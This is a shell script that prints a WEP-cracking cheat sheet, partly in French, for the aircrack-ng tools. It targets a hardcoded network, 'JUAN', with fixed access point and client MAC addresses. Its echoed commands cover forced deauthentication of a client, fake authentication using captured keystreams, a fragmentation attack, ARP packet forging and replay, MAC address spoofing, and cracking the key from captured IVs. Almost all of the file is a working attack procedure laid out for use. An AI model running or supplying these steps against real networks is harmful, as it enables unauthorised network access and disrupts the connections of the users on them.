int="wlan0"
ssid="JUAN"
channel="1"
ap="00:24:D4:50:E0:3C"
host="00:19:FD:02:C1:C1"
host2="18:9E:FC:1F:2E:A2"
xor1="AP-mac_adresse.xor"
xor2="fragment-xx.xor"
output="ska"

clear

echo "----"
echo "rmmod r8187"
echo "modprobe r8187"
echo "rmmod r8187"
echo "rmmod /proc/modules"
echo "rmmod rtl8187"
echo "modprobe r8187"
echo "ifconfig wlan0 up"

echo "-----"
echo "## SKA identification:"
echo "aireplay-ng -1 1 -a $ap $int"
echo "Switch to Share Key Authentication displaying"

echo "-----"
echo "## Capture Output:"	
echo "# dump"
echo "airodump-ng --encrypt WEP $int"
echo "airodump-ng -c $channel --encrypt WEP -w $output --bssid $ap $int"

echo "-----"
echo "# Desauth to generate ARP (XOR1 generation)"
echo "aireplay-ng -0 0 -a $ap -c $host $int"

echo "-----"
echo "## Fake Auth (requetes avec le keystream, genere des requêtes ARP à utiliser pour l'attaque par fragmentation):	" 
echo "# Virer le -h si pas de check de la mac par la suite"
echo "aireplay-ng -1 6000 -q 5 -e $ssid –a $ap -h $host -y $xor1 $int"
echo "# ou"
echo "aireplay-ng -1 0 -e $ssid -a $ap -h $host -y $xor2 $int"

echo "-----"
echo "# Attaque par fragmentation (XOR2 generation depuis les arp-reply)"
echo "aireplay-ng -5 -b $ap -h $host -l 255.255.255.255 -k 255.255.255.255 $int"

echo "-----"
echo "## Create Packet from xor file:"	
echo "packetforge-ng -0 -a $ap -h $host -l 255.255.255.255 -k 255.255.255.255 -y $xor2 -w arp-request.cap"


echo "-----"
echo "## Natural Replay:"	
echo "aireplay-ng -2 -b $ap -r arp-request.cap $int"
echo "Generation of IVs, be patient ..."

echo "-----"
echo "## Crack:	 "
echo "aircrack-ng -0 -n 64/128 $output.cap"

echo "-----"
echo "-----"
echo "OR"
echo "-----"
echo "-----"

echo "## Spoof the mac address"
echo "ifconfig $int down"
echo "macchanger –mac $host $int"
echo "ifconfig $int up"

echo "-----"
echo "## Capture Output:"	
echo "airodump-ng –c $channel -w $output –bssid $ap $int"

echo "-----"
echo "## Arp replay attack:"
echo "aireplay-ng -3 -e $ssid -b $ap -h $host $int"

echo "-----"
echo "## Desauth to generate ARP"
echo "aireplay-ng -0 1 -a $ap -c $host $int"


echo "-----"
echo "## Crack:	 "
echo "aircrack-ng -0 -n 64/128 $output.cap"

